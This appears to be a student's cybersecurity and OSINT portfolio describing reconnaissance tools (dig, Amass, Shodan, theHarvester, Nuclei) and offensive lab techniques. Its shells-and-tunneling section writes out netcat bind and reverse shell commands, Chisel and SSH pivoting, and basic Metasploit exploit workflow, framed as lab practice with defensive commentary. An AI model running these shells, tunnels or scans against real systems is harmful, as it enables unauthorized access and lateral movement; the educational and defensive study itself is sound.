
📌 Introduction
Cybersecurity and Open Source Intelligence (OSINT) are at the core of safeguarding digital environments and uncovering valuable insights from publicly available data. This portfolio highlights my foundational knowledge and practical skills in these areas, covering essential concepts such as DNS fundamentals, zone transfer attacks, advanced subdomain enumeration with Amass, and reconnaissance using Shodan. Each section demonstrates not only technical understanding but also hands-on application, reflecting my ability to approach security challenges with both analytical and practical expertise.
Through this work, I aim to showcase my growth in cybersecurity and OSINT, my commitment to ethical practices, and my readiness to contribute to projects that require strong investigative and defensive capabilities.

🌐 Assets discovery;DNS Fundamentals
Overview The Domain Name System (DNS) is the backbone of the internet, translating human-readable domain names into IP addresses that computers use to communicate. Without DNS, users would need to remember long strings of numbers instead of simple names like example.com. In cybersecurity, DNS is critical because misconfigurations or vulnerabilities can expose sensitive information and create attack vectors. 
Practical Demonstration
Used the dig command to query DNS records for a domain.
Explored different record types (A, MX, NS, TXT) to understand how domains are structured.
Documented how attackers might exploit DNS misconfigurations, such as open zone transfers.
Key Takeaways
Learned how DNS serves as both a convenience and a potential security risk.
Gained hands-on experience with DNS queries and record analysis.
Recognized the importance of monitoring and securing DNS infrastructure.
Tools & Skills Demonstrated
Tools: dig, nslookup
Skills: DNS analysis, reconnaissance, vulnerability awareness


DNS with NSlookup
Use nslookup to extract DNS records and perform reverse lookups for example.com
Hands on example;

Zone Transfer Attack
Overview  
A zone transfer attack occurs when a DNS server is misconfigured to allow unauthorized replication of its zone file. This file contains detailed records about a domain, including hostnames, IP addresses, and mail servers. If exposed, attackers can map out an organization’s internal network structure, making it easier to plan further attacks.
Practical Demonstration
Attempted a zone transfer using the dig command:
dig @ns1.example.com example.com AXFR 
Result;
 Key Takeaways
Learned how misconfigurations can leak critical data.
Reinforced the importance of securing DNS servers.
Tools & Skills Demonstrated
Tool: dig,nslookup
Skills: DNS analysis, vulnerability identification,ethical testing.
Subfinder– Fast Subdomain Enumeration 
Subfinder is a powerful tool designed for discovering subdomains quickly and efficiently. It leverages passive sources, online APIs, and wordlists to enumerate subdomains without sending intrusive requests that might alert security systems. In cybersecurity and OSINT, subdomain discovery is crucial for mapping an organization’s attack surface and identifying hidden assets. 
Example;subfinder -d example.com 
Result;

Collected subdomains from multiple passive sources.
Compared results with other tools (like Amass) to highlight speed and efficiency.
Documented findings and explained how attackers could use discovered subdomains for reconnaissance.
Key Takeaways
Learned how Subfinder balances speed with accuracy by relying on passive enumeration.
Understood the importance of combining multiple tools for comprehensive subdomain discovery.
Reinforced the ethical use of such tools in penetration testing and security research.
Tools & Skills Demonstrated
Tool: Subfinder
Skills: Subdomain enumeration, reconnaissance, passive information gathering


Amass - Advanced Subdomain Enumeration
Amass is a comprehensive tool for in-depth subdomain enumeration and network mapping. Unlike lightweight tools, Amass combines passive and active techniques, integrates multiple data sources, and can even perform DNS brute forcing. In cybersecurity and OSINT, Amass is invaluable for uncovering hidden infrastructure and understanding the full scope of an organization’s online presence. 
This is used for comprehensive subdomain enumeration and intelligence gathering. Amass is a powerful tool that combines passive and active reconnaissance techniques. 
Example;amass enum -d example.com ,
Result 



Practical Demonstration
Ran Amass in passive mode to collect subdomains from public sources:
Used active enumeration to probe DNS records and expand findings.
Compared Amass results with Subfinder to highlight depth versus speed.
Visualized the discovered network structure using Amass’s graphing features.
Key Takeaways
Learned how Amass provides a more thorough view of subdomains compared to faster, passive-only tools.
Understood the importance of combining passive and active techniques for comprehensive reconnaissance.
Reinforced the ethical use of Amass in penetration testing and red team engagements.
Tools & Skills Demonstrated
Tool: Amass
Skills: Advanced subdomain enumeration, DNS analysis, network mapping, reconnaissance


Shodan
 Shodan is a specialized search engine that indexes information about internet-connected devices. Unlike traditional search engines, Shodan scans ports and services to reveal what devices are publicly accessible online. In cybersecurity and OSINT, Shodan is a powerful tool for identifying exposed systems, misconfigurations, and potential vulnerabilities across the internet. 
example ;shodan domain example.com 

Practical Demonstration
Queried Shodan for devices running a specific service
Filtered results by country and organization to narrow scope.
Documented findings, showing how attackers could exploit exposed services if left unsecured.
Highlighted ethical use cases, such as monitoring one’s own organization for exposed assets.
Key Takeaways
Learned how Shodan provides visibility into the global landscape of connected devices.
Understood the risks of leaving services exposed without proper firewalls or authentication.
Reinforced the importance of proactive monitoring and securing internet-facing infrastructure.
Tools & Skills Demonstrated
Tool: Shodan
Skills: Device reconnaissance, vulnerability awareness, OSINT analysis.

Organization Information Harvesting 
🌾 theHarvester
TheHarvester is an OSINT tool designed to collect emails, subdomains, IPs, and hostnames from public sources such as search engines and PGP key servers. It’s widely used in reconnaissance to identify an organization’s external footprint. In cybersecurity, TheHarvester helps security professionals understand what information is publicly exposed and could be leveraged by attackers. 
Example; theHarvester -d example.com -b all 
All can also be replaced with linkedin,github or whichever source at use.
Result;

Practical Demonstration
Ran TheHarvester against a target domain using:
Gather email addresses, subdomains, and IPs from Google search results.
Exported findings into a report for analysis.
Compared results with other tools (like Subfinder and Amass) to highlight complementary strengths.
Key Takeaways
Learned how TheHarvester automates OSINT collection from multiple sources.
Understood the importance of monitoring what information about an organization is publicly available.
Reinforced the ethical use of TheHarvester in penetration testing and security assessments.
Tools & Skills Demonstrated
Tool: TheHarvester
Skills: OSINT collection, reconnaissance, email and subdomain discovery, reporting
h8mail
H8mail is an OSINT and cybersecurity tool used to search for compromised email addresses across public breaches and leak databases. It helps security professionals identify whether accounts have been exposed, allowing organizations or individuals to take proactive steps such as password resets and multi-factor authentication. 
Practical Demonstration
Ran H8mail against a test email address using:h8mail -t example.com 
Queried multiple breach sources and APIs to check for exposure.
Documented findings, showing which breaches contained the test email.
Highlighted how attackers could exploit leaked credentials if not remediated.
Result;

Key Takeaways
Learned how H8mail automates breach hunting across multiple sources.
Understood the importance of monitoring email addresses for exposure.
Reinforced the need for strong password hygiene and multi-factor authentication.
Tools & Skills Demonstrated
Tool: H8mail
Skills: Breach detection, credential exposure analysis, OSINT investigation

🌐 Service Interaction 
Basic Connectivity
Basic connectivity refers to the fundamental ability of devices and networks to communicate with each other. It involves ensuring that systems can establish and maintain reliable connections using protocols such as TCP/IP. In cybersecurity and OSINT, understanding connectivity is essential because attackers often exploit weak or misconfigured connections to gain unauthorized access. 

Practical Demonstration
Verified connectivity using the ping command to test reachability of a host.
Checked open ports with telnet or nc (netcat) to confirm service availability.
Documented how connectivity tests can reveal misconfigurations or exposed services.
Key Takeaways
Learned how basic tools like ping and traceroute provide quick insights into network health.
Understood that connectivity checks are the first step in reconnaissance and troubleshooting.
Reinforced the importance of monitoring and securing exposed services to prevent exploitation.
Tools & Skills Demonstrated
Tools: ping, traceroute, telnet, nc
Skills: Network troubleshooting, connectivity analysis, reconnaissance fundamentals
telnet 192.168.56.103 23
 telnet <ip> <port>: Connect using telnet 
Result;



Banner grabbing

Banner grabbing is a reconnaissance technique used to gather information about a service running on an open port. When a connection is made, many services return a “banner” that reveals details such as the software name, version, and sometimes configuration information. In cybersecurity, banner grabbing is important because attackers can use this data to identify vulnerable software versions and plan exploits. 
Practical Demonstration
Connected to a web server using telnet and observed the HTTP response header:
telnet example.com 80
GET / HTTP/1.1
Host: example.com
Used nc (netcat) to grab banners from multiple ports.
Ran nmap with the -sV option to automate banner grabbing and service version detection.
Documented findings, showing how banners can reveal critical information about services.
Key Takeaways
Learned how banners expose software details that can be exploited if outdated or misconfigured.
Understood the importance of disabling or obfuscating banners to reduce information leakage.
Reinforced the role of banner grabbing in penetration testing and vulnerability assessments.
Tools & Skills Demonstrated
Tools: telnet, nc, nmap
Skills: Service enumeration, vulnerability identification, reconnaissance

Basic HTTP Requests with cURL & wget
HTTP requests are the foundation of web communication, allowing clients to interact with servers by sending and receiving data. Tools like cURL and wget are essential for testing, troubleshooting, and automating these requests. In cybersecurity and OSINT, they are used to probe endpoints, download content, and analyze server responses. 

Practical Demonstration
Used cURL to send a simple GET request and view the raw HTTP response:

curl -v http://example.com
Sent a POST request with data using cURL:
Downloaded a webpage with wget:
bash
wget http://example.com


Automated bulk downloads with wget options like -r (recursive) and -c (continue).
Documented how these tools reveal headers, status codes, and server behavior.


Key Takeaways
Learned how HTTP requests expose valuable information about server configurations.
Understood the difference between GET and POST requests in practice.
Reinforced the importance of analyzing headers and responses for reconnaissance and troubleshooting.
Tools & Skills Demonstrated
Tools: cURL, wget
Skills: HTTP request analysis, server interaction, content retrieval, reconnaissance

HTTP Headers and response analysis
HTTP headers are metadata exchanged between clients and servers during web communication. They provide critical information such as content type, server details, cookies, and authentication requirements. In cybersecurity and OSINT, analyzing headers helps identify technologies in use, potential misconfigurations, and security weaknesses. 
Practical Demonstration
Sent a request with cURL to inspect response headers:
curl -I http://example.com
Observed headers such as Server, Content-Type, and Set-Cookie.
Used browser developer tools (Network tab) to analyze headers in real time.Documented how headers can reveal server software versions, caching policies, and security controls (e.g., Strict-Transport-Security, X-Frame-Options).


Key Takeaways
Learned how headers expose valuable information about server configurations.
Understood the importance of security headers in protecting against attacks like clickjacking and man-in-the-middle.
Reinforced the need for organizations to configure headers properly to reduce information leakage.
Tools & Skills Demonstrated
Tools: cURL, browser developer tools
Skills: HTTP analysis, server fingerprinting, security header evaluation

SSL/TLS Certificate Handling
SSL/TLS certificates are essential for securing communication between clients and servers by enabling encryption and authentication. They ensure data integrity, protect against man-in-the-middle attacks, and build user trust through HTTPS. In cybersecurity, understanding certificate handling is critical for identifying misconfigurations, expired certificates, or weak encryption practices. 

Practical demonstration
Checked a website’s SSL/TLS certificate details using openssl: 
Verified certificate validity, issuer, and expiration date.
Used browser developer tools to inspect certificate chains and encryption strength.
Documented how expired or self-signed certificates can weaken trust and expose users to risks.

Key Takeaways
Learned how SSL/TLS certificates establish secure communication channels.
Understood the importance of proper certificate management (renewal, trusted issuers, strong ciphers).
Reinforced the role of certificates in preventing eavesdropping and ensuring authenticity.
Tools & Skills Demonstrated
Tools: openssl, browser developer tools
Skills: Certificate inspection, encryption analysis, secure communication validation

Advanced curl technique
Beyond basic GET and POST requests, cURL offers advanced options for interacting with web servers, APIs, and secured endpoints. These techniques are essential in cybersecurity and OSINT for testing authentication, analyzing responses, and automating complex interactions with web services. 

Practical Demonstration
Custom Headers: Sent requests with custom headers to mimic different clients or test security controls:
Authentication: Tested endpoints requiring credentials: curl -u username:password http://example.com/secure
SSL/TLS Handling: Verified certificate details and bypassed checks (for testing only): curl --insecure https://example.com
Data Uploads: Uploaded files to a server: curl -F "file=@report.pdf" http://example.com/upload
API Interaction: Queried JSON APIs and parsed responses: curl -H "Accept: application/json" http://api.example.com/data



Key Takeaways
Learned how advanced cURL options enable deeper interaction with servers and APIs.
Understood the importance of headers, authentication, and SSL/TLS handling in secure communications.
Reinforced how attackers and defenders alike use these techniques for reconnaissance, testing, and automation.
Tools & Skills Demonstrated
Tool: cURL
Skills: Advanced HTTP requests, API interaction, authentication testing, SSL/TLS handling, file transfer


OSINT(Open system intelligence)
Recon-ng Framework
Recon-ng is a modular, open-source reconnaissance framework written in Python. It provides a powerful environment for gathering OSINT data, similar to Metasploit but focused on information collection. With its modular design, Recon-ng allows security professionals to automate tasks such as domain discovery, contact harvesting, and vulnerability identification. 
Practical Demonstration
Launched Recon-ng and created a workspace for a target domain:
Recon-ng
workspaces create example
Added a target domain to the database: 
add domains example.com
Loaded modules for subdomain enumeration and contact harvesting: 
modules load recon/domains-hosts/bing_domain_web
run
Exported results into a report for analysis.
Compared Recon-ng’s modular approach with standalone tools like TheHarvester and Subfinder.

Key Takeaways
Learned how Recon-ng streamlines OSINT collection with a structured, modular workflow.
Understood the importance of workspaces for organizing reconnaissance projects.
Reinforced the value of automation in large-scale information gathering.
Tools & Skills Demonstrated
Tool: Recon-ng
Skills: OSINT automation, modular reconnaissance, domain and contact discovery, reporting
Spiderfoot
SpiderFoot is an open-source OSINT automation tool that integrates with dozens of data sources to gather intelligence about domains, IPs, emails, and more. It provides a comprehensive way to map an organization’s digital footprint, making it invaluable for reconnaissance and threat intelligence. 
Practical Demonstration
Ran SpiderFoot against a target domain using:
spiderfoot -s example.com
Configured modules to collect data from sources such as WHOIS, DNS records, and breach databases.
Generated a detailed report showing subdomains, IP addresses, emails, and potential vulnerabilities.
Compared SpiderFoot’s automated results with manual tools like TheHarvester and Recon-ng to highlight efficiency.

Key Takeaways
Learned how SpiderFoot automates OSINT collection across multiple sources simultaneously.
Understood the importance of automation in large-scale reconnaissance and threat intelligence.
Reinforced the ethical use of SpiderFoot for security assessments and monitoring one’s own organization.
Tools & Skills Demonstrated
Tool: SpiderFoot
Skills: OSINT automation, domain and IP intelligence, breach data analysis, reporting

Target Validation
Httpx
Target validation is the process of confirming which discovered subdomains or hosts are actually alive and responsive. After enumeration tools like Subfinder or Amass generate large lists of potential subdomains, many of them may not resolve or host active services. httpx is a fast and flexible tool that helps validate these targets by probing them with HTTP requests. 
Practical Demonstration
Ran httpx against a list of discovered subdomains:
httpx -l subdomain.txt
Verified which subdomains responded with valid HTTP status codes.
Collected details such as response status, title, and server information.
Documented how validated targets can then be prioritized for deeper analysis (e.g., banner grabbing, vulnerability scanning)

Key Takeaways
Learned how httpx streamlines the process of filtering active hosts from large subdomain lists.
Understood the importance of validating targets before investing time in deeper reconnaissance.
Reinforced how attackers and defenders alike use validation to focus on real, exploitable assets.
Tools & Skills Demonstrated
Tool: httpx
Skills: Target validation, HTTP probing, reconnaissance workflow optimization
Naabu
Naabu is a fast port scanning tool developed by ProjectDiscovery. It’s designed to quickly identify open ports on target hosts, making it a critical step in reconnaissance and vulnerability assessment. Unlike traditional scanners, Naabu emphasizes speed and efficiency, integrating seamlessly with other tools like httpx for validation. 
Practical Demonstration
Ran Naabu against a target domain to identify open ports:
naabu -host example.com
Collected results showing which ports were open and responsive.
Combined Naabu’s output with httpx to validate active services.
Documented findings, highlighting how attackers could exploit exposed ports if left unsecured.


Key Takeaways
Learned how Naabu accelerates port scanning compared to slower, traditional tools.
Understood the importance of identifying open ports as part of a complete attack surface analysis.
Reinforced the need for organizations to monitor and secure exposed ports to prevent exploitation.
Tools & Skills Demonstrated
Tool: Naabu
Skills: Port scanning, target validation, attack surface analysis, reconnaissance workflow

Nuclei
Nuclei is a fast, template-based vulnerability scanner developed by ProjectDiscovery. It allows security professionals to automate the detection of misconfigurations, exposures, and known vulnerabilities across validated hosts. By leveraging a large library of community-driven templates, Nuclei provides scalable and customizable security assessments. 
Practical Demonstration
Ran Nuclei against a list of live hosts discovered during reconnaissance:
nuclei -l live_hosts.txt
Applied default templates to identify common misconfigurations and exposures.
Documented findings such as missing security headers, outdated software versions, and exposed panels.
Integrated Nuclei into the workflow after httpx and naabu to ensure only active hosts were scanned.

Key Takeaways
Learned how Nuclei automates vulnerability detection using a template-driven approach.
Understood the importance of chaining tools (Subfinder → httpx → Naabu → Nuclei) for a complete reconnaissance and scanning pipeline.
Reinforced the ethical use of Nuclei in penetration testing and security assessments.
Tools & Skills Demonstrated
Tool: Nuclei
Skills: Vulnerability scanning, template-based automation, attack surface analysis, workflow integration

Shells and tunneling

Shells provide the attacker’s entry point, SSH enables stealthy control, and advanced tunnelling techniques make pivoting across networks possible while evading detection. 
Bind shell
A bind shell is a type of shell where the target machine opens a listening port and waits for incoming connections. Once the attacker connects, they gain command execution on the victim system. Unlike reverse shells, the victim initiates the listener, and the attacker connects to it.
Practical Demonstration
On the target machine (192.168.56.210):
bash
nc -l -p 4444 -e /bin/bash
This sets up a listener on port 4444 and binds /bin/bash to it.
On the attacker machine:
bash
nc 192.168.56.210 4444
This connects to the target’s listener, giving the attacker an interactive shell to run commands remotely.

Key Takeaways
Bind shells require the victim to expose a port, which can be detected by network monitoring.
They are simpler than reverse shells but less stealthy, since the victim must allow inbound connections.
Useful in controlled lab environments for demonstrating shell concepts.
Tools & Skills Demonstrated
Netcat (nc) – versatile networking utility for creating shells and tunnels.
Linux command-line proficiency – setting up listeners and executing commands.
Networking fundamentals – understanding ports, connections, and traffic flow.
Offensive security techniques – showcasing how attackers gain remote access.

Reverse Shell 
A reverse shell is a type of shell where the victim machine initiates a connection back to the attacker’s machine. This is often used to bypass firewall restrictions that block inbound connections, making it stealthier than a bind shell.
Practical Demonstration
On the attacker machine (listener):
bash
nc -lvp 4444
This sets up a listener on port 4444, waiting for incoming connections.
On the victim machine (192.168.56.200):
bash
nc 192.168.56.200 4444 -e /bin/bash
This command connects back to the attacker’s listener and binds /bin/bash to the connection, giving the attacker remote command execution.

Key Takeaways
Reverse shells are more stealthy than bind shells because the victim initiates the connection.
They are commonly used in real-world attacks to bypass NAT/firewall restrictions.
Useful for demonstrating how attackers maintain control in restricted environments.
Tools & Skills Demonstrated
Netcat (nc) – used to set up listeners and connections.
Linux command-line proficiency – executing shell commands and managing processes.
Networking fundamentals – understanding inbound vs. outbound connections.
Offensive security techniques – showcasing attacker methods for remote access and evasion.

Advanced Netcat & File Transfer techniques
Netcat is often called the “Swiss Army knife” of networking because of its ability to create raw TCP (Transmission control protocol) and UDP (User Datagram protocol)connections with minimal overhead. Beyond simple port listening and banner grabbing, Netcat can be used for direct file transfer between machines — a technique valuable in penetration testing, incident response, and controlled lab environments. This module demonstrates how to transfer files between an attacker and victim machine using Netcat’s lightweight communication capabilities. 


Practical Demonstration
Confirming the File on the Attacker Machine
Before initiating a transfer, verify that the file exists and is accessible:
bash
ls
This lists all files in the current directory.

In this scenario, the file to be transferred is:
Code
secret.txt

Preparing the Victim Machine to Receive the File
On the victim machine, Netcat is used in listen mode. It waits for incoming data and writes it directly into a file.
bash
nc -l -p 4444 > secret.txt

Explanation:
nc — Netcat
-l — listen mode
-p 4444 — listening on port 4444
> secret.txt — save incoming data into secret.txt
This sets up the victim machine as a receiver.

Sending the File from the Attacker Machine
On the attacker machine, Netcat connects to the victim’s listener and streams the file across the network.
bash
nc 192.168.56.210 4444 < secret.txt

Explanation:
nc 192.168.56.210 4444 — connect to the victim’s IP and port
< secret.txt — send the contents of secret.txt through the connection
Once executed, the file is transferred over a raw TCP connection.
Verifying the Transfer
On the victim machine:
bash
ls
cat secret.txt

Confirm that secret.txt exists and its contents match the original file.



Key Takeaways
Netcat can be used for direct file transfer without relying on FTP, SCP, or SMB.
The technique is lightweight, fast, and effective in restricted environments.
File transfer requires two roles:
Listener (receiver) → victim machine
Sender (initiator) → attacker machine
Raw TCP streams allow Netcat to move data with minimal logging or protocol overhead.
This method is commonly used in labs, CTFs, and penetration testing scenarios.
Tools & Skills Demonstrated
Netcat (nc) — listening, connecting, and data redirection
Linux command-line proficiency
TCP communication fundamentals
File handling and verification
Understanding attacker ↔ victim data flow
Practical exploitation workflow skills

Ssh dynamic port forwarding 
SSH Dynamic Port Forwarding allows you to create a local SOCKS proxy that tunnels traffic securely through an SSH connection. Instead of forwarding a single port, dynamic forwarding lets you route any application’s traffic through the SSH tunnel, giving you flexible access to internal networks, hidden services, or restricted environments. This technique is commonly used in penetration testing, red teaming, and secure remote access scenarios. 

Practical Demonstration
Start SSH Service on the Victim Machine
Ensure SSH is running on the victim (remote) machine:
systemctl start ssh
This enables incoming SSH connections. 
Create a Dynamic SOCKS Proxy on the Attacker Machine
From the attacker machine, establish an SSH connection with dynamic port forwarding:
ssh -D 1080 admin@192.168.1.100
-D 1080 creates a SOCKS5 proxy on local port 1080
All traffic routed through this proxy will travel inside the encrypted SSH tunnel
Your attacker machine now has a SOCKS proxy at:
localhost:1080
Compare External IP Addresses (Before Using the Proxy)
Before routing traffic through the tunnel, check your attacker machine’s real external IP:
curl https://ifconfig.me
This shows your normal public IP address. 

Access Internal Web Resources Through the Tunnel
Now route traffic through the SOCKS proxy to reach internal systems:
curl --socks5 localhost:1080 http://internal-web.local
This allows the attacker machine to browse internal sites as if it were inside the victim’s network. 
Compare External IP Addresses (After Using the Proxy)
Run the same IP check, but through the SOCKS proxy:
curl --socks5 localhost:1080 https://ifconfig.me
The IP shown will now be the victim machine’s external IP, not the attacker’s.
This confirms that all traffic is being routed through the SSH tunnel.


Key takeaways 
Dynamic port forwarding creates a flexible SOCKS proxy for tunneling any application’s traffic.
Traffic routed through the proxy is encrypted and appears to originate from the victim machine.
Comparing IP addresses before and after using the proxy verifies successful tunneling.
Useful for accessing internal networks, hidden services, or restricted environments.
Works with tools like curl, browsers, proxychains, and other SOCKS‑aware applications. 
Tools and skills demonstrated 
SSH Dynamic Port Forwarding (ssh -D)
SOCKS5 proxy usage
curl for network verification
Linux service management (systemctl)
Network tunneling and secure routing
Internal network enumeration
Understanding attacker ↔ victim network flow


SSH Local & Remote Port Forwarding 
SSH port forwarding (also called SSH tunneling) allows you to securely route network traffic through an encrypted SSH connection. It’s commonly used for accessing internal services, bypassing firewall restrictions, or exposing local services to remote machines. 
There are two major types:
Local Port Forwarding (-L)  
You open a port on your local machine and forward traffic through SSH to a remote internal service.
Useful when you want to access a service that only exists inside a remote network.
Remote Port Forwarding (-R)  
You open a port on the remote machine and forward traffic back to your local machine.
Useful when you want to expose your local service to a remote system.
Both methods create a secure tunnel that protects the forwarded traffic.
Practical Demonstration
Start SSH Server on the Target Machine
Before any forwarding works, the remote machine must be running an SSH server.
bash
sudo systemctl start ssh
This ensures the victim/target machine is accepting SSH connections.
Start an Internal Service (Simulated Web Server)
On the victim’s machine, start a simple internal service using nc (netcat):
nc -l -p 80
This listens on port 80, simulating an internal web server that is not exposed externally. 
Local Port Forwarding (ssh -L)
You want to access the victim’s internal service from your own machine.
ssh -L 8080:internal-web.local:80 admin@victim-ip
-L → Local port forwarding
8080 → Port on your machine
internal-web.local:80 → Internal service on the victim’s machine
admin@victim-ip → SSH login to victim
You can now open 
http://localhost:8080

And you will see the internal service running on the victim’s port 80 — even though it’s not publicly accessible. 
Key takeaways
SSH tunneling provides secure access to internal services hidden behind network segmentation.
It demonstrates how encrypted tunnels support pivoting and restricted service access.
It reinforces practical understanding of navigating segmented environments and validating internal services
Tools & skills demonstrated
Tool: SSH
Skills: encrypted tunneling, network pivoting, internal service access, local & remote forwarding, service testing


Advanced Tunneling with Chisel & Socat
Advanced tunneling is a technique used to move traffic between networks that normally cannot communicate directly. Tools like Chisel and Socat help cybersecurity professionals understand how attackers bypass firewalls, pivot inside segmented networks, and expose internal services. In defensive cybersecurity, learning these tunneling patterns is essential for detecting unauthorized lateral movement, monitoring outbound connections, and strengthening internal network controls. 
Practical demonstration 
Download and Set Up Chisel
A lightweight tunneling tool is downloaded from its official release source:
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/
This illustrates how tunneling binaries appear on a system and how defenders can detect unusual downloads or installations. 
Start Chisel Server (Reverse Mode)
A Chisel server is started on a remote machine in reverse mode:
chisel server --port 8080 --reverse
Reverse mode allows incoming reverse connections. Defensively, this highlights why monitoring unexpected listening ports is essential. 
chisel client 192.168.1.100:8080 R:8080:internal-web.local:80
This demonstrates how internal services can be forwarded outward. Defenders use this knowledge to identify suspicious outbound connections and reverse tunnel patterns. 
Create a Socat TCP Relay
Socat is used to create a TCP relay from a local port to an internal API service:
socat TCP-LISTEN:9090,fork TCP:internal-api.local:8080
This shows how tunneling tools can be chained together. From a defensive perspective, this highlights unusual local listeners and chained forwarding behavior. 
Test the Forwarded Tunnel
A simple HTTP request verifies that the forwarded service is reachable:
curl http://localhost:8080
This confirms that the tunnel is functioning and demonstrates how forwarded services behave externally — helping defenders understand detection points such as unexpected localhost traffic or anomalous HTTP responses. 


Key Takeaways
Reverse tunneling can expose internal services externally, making outbound traffic monitoring critical.
Chisel provides flexible tunneling over HTTP, often used to bypass firewalls or NAT boundaries.
Socat enables powerful port forwarding and relaying, showing how attackers chain tools to pivot deeper into networks.
Understanding tunneling behavior helps defenders identify suspicious listeners, unexpected outbound connections, and anomalous localhost traffic
Network segmentation is only effective when paired with strong logging, IDS/IPS alerts, and endpoint monitoring.
Defensive teams must watch for tools that create reverse tunnels, as they often indicate unauthorized access or lateral movement attempts.
Practicing these concepts in a controlled lab builds the skills needed to detect and respond to real-world tunneling activity

Tools & Skills Demonstrated
Chisel — lightweight TCP/UDP tunneling over HTTP
Socat — versatile TCP relay and port forwarding
curl — validating forwarded services
Reverse Tunneling Concepts
Network Pivoting Fundamentals
Traffic Redirection & Port Forwarding
Outbound Traffic Monitoring
Detection of Unauthorized Tunnels
Understanding Lateral Movement Techniques

Proxychains - Universal Proxy Routing
Proxychains is a tool that forces any TCP connection made by an application to follow through a proxy such as SOCKS or HTTP. In cybersecurity, it is often used to route traffic through multiple proxies, making it appear as though requests originate from different IP addresses.For defenders, understanding Proxychains is important because attackers may use it to mask their origin, evade detection, or pivot through compromised systems. By studying its behavior in a controlled lab, analysts learn how to detect unusual proxy usage and strengthen monitoring of outbound traffic.

Practical Demonstration (Safe, Defensive Cybersecurity Context)
This demonstration shows how Proxychains works inside a controlled lab environment. The goal is to illustrate how traffic can be routed through proxies and how defenders can detect these patterns.
Start SSH Server
An SSH server is started to provide a secure channel for proxying:
Code
systemctl start ssh
This step highlights how attackers may leverage existing SSH services, and why monitoring SSH activity is critical.

Create SOCKS Proxy via SSH
A SOCKS proxy is created using SSH dynamic port forwarding:
Code
ssh -D 1080 admin@192.168.1.100
This demonstrates how traffic can be redirected through a SOCKS proxy.
Defensively, this shows why unusual SSH sessions with dynamic forwarding should raise alerts.

Check Proxychains Configuration
The Proxychains configuration file is reviewed:
Code
cat /etc/proxychains.conf
This file defines which proxies traffic will be routed through.
Defenders can monitor for unauthorized changes to proxy configuration files.

Use Proxychains with Nmap
Proxychains is used to route an Nmap scan through the proxy:
Code
proxychains nmap -sT -p 80 internal-web.local
This demonstrates how reconnaissance can be masked behind proxies.
Defensively, this highlights the need to detect proxied scans and unusual traffic patterns.

Test IP Difference
A simple HTTP request is routed through Proxychains to confirm the IP address difference:
Code
proxychains curl https://ifconfig.me

This shows how Proxychains alters the apparent source IP.
Defenders can use this knowledge to spot discrepancies between expected and observed IP 
Addresses.



Key Takeaways
Proxychains forces applications to route traffic through proxies, masking the true origin.
SSH dynamic port forwarding can be abused to create SOCKS proxies.
Monitoring configuration files like /etc/proxychains.conf is essential to detect unauthorized proxy setups.
Proxied scans and requests may appear to originate from external IPs, complicating detection.
Defensive teams must correlate logs to identify when traffic is being routed through proxies.
Understanding Proxychains helps defenders recognize attempts to evade detection and maintain anonymity.
Tools & Skills Demonstrated
Proxychains — universal proxy routing tool
SSH — secure channel with dynamic SOCKS proxy capability
Nmap — scanning through proxied connections
curl — verifying IP address differences
Proxy Configuration Analysis
Traffic Redirection & Obfuscation
Detection of Proxied Reconnaissance
Outbound Traffic Monitoring
Defensive Correlation of Logs
🧰 Metasploit 

Basic Metasploit Commands
Metasploit is a widely used penetration testing framework that provides tools for exploit development, payload delivery, and post‑exploitation activities. It is often leveraged by attackers, but in defensive cybersecurity, learning Metasploit is essential for understanding how exploits are launched, how payloads behave, and how defenders can detect and mitigate these activities.
By practicing basic commands in a controlled lab, analysts gain insight into attacker workflows and strengthen their ability to recognize malicious activity.
Practical Demonstration (Safe, Defensive Cybersecurity Context)
This demonstration highlights the fundamental commands used in Metasploit within a controlled lab environment. The goal is to illustrate how the framework operates and how defenders can monitor its usage.
 Launch Metasploit Console
Start the Metasploit framework console:
Code
msfconsole

This opens the interactive environment where exploits, payloads, and auxiliary modules are managed.
Defensively, this shows how the presence of msfconsole can be a detection point on endpoints.
Search for Modules
Search for available exploits or auxiliary modules:
Code
search <keyword>

This demonstrates how attackers locate modules for specific vulnerabilities.
Defenders can monitor for unusual search activity or module usage.
Use a Module
Load a specific exploit or auxiliary module:
Code
use <module_path>

This command highlights how modules are activated.
Defensively, this shows why monitoring process execution and module loading is important.
 Show Options
Display configurable parameters for the selected module:
Code
show options
This reveals required settings such as target IPs or payloads.
Defenders can use this knowledge to anticipate what attackers may configure.
Set Parameters
Configure module options:
Code
set RHOST <target_ip>
set RPORT <target_port>

This demonstrates how attackers define targets.
Defensively, this highlights the importance of monitoring for unusual connections to internal services.
Run or Exploit
Execute the module:
Code
run
or
Code
exploit

This launches the attack in the lab environment.
Defenders can study the resulting traffic patterns and alerts triggered by IDS/IPS systems.


Key Takeaways
Metasploit provides a structured workflow for launching exploits and payloads.
Basic commands (search, use, show options, set, run) form the foundation of attacker activity.
Understanding these commands helps defenders anticipate attacker behavior.
Monitoring for Metasploit binaries and console activity is a key detection strategy.
Network monitoring and endpoint logging are essential to catch exploit attempts.
Practicing in a controlled lab builds defensive awareness of attacker workflows.
Tools & Skills Demonstrated
Metasploit Framework (msfconsole) — exploit and payload management
Module Search & Usage — identifying and loading exploits
Configuration Management — setting parameters for modules
Execution Commands — running exploits in a lab environment
Detection Strategies — monitoring binaries, logs, and traffic patterns
Defensive Awareness — understanding attacker workflows for better response


Run an Auxiliary Module
Metasploit’s auxiliary modules provide functionality beyond exploitation, such as scanning, enumeration, and service discovery. These modules are often used by attackers to gather information about targets, but in defensive cybersecurity, practicing them in a controlled lab helps analysts understand how reconnaissance is performed and how to detect it.
By running a TCP port scanner auxiliary module, defenders can observe how port scanning traffic looks, what services are exposed, and how monitoring tools can catch these activities.
Practical Demonstration (Safe, Defensive Cybersecurity Context)
This demonstration shows how to run a basic auxiliary scanner module in Metasploit inside a controlled lab environment.
 Launch Metasploit Console
Code
msfconsole

Opens the interactive Metasploit environment.
Use the TCP Port Scanner Module
Code
use auxiliary/scanner/portscan/tcp

Loads the TCP port scanning auxiliary module.
Set Target Range
Code
set RHOSTS 192.168.56.100-105

Defines the target IP range for scanning.
Defensively, this shows how attackers may probe multiple hosts at once.
Run the Module
Code
run

Executes the scan, attempting to discover open ports and services.
Defenders can monitor for bursts of connection attempts across multiple ports and IPs.


Key Takeaways
Auxiliary modules extend Metasploit’s functionality beyond exploitation.
The TCP port scanner demonstrates how attackers perform reconnaissance.
Defenders should monitor for rapid port sweeps across multiple hosts.
IDS/IPS systems can detect port scanning activity by analyzing connection patterns.
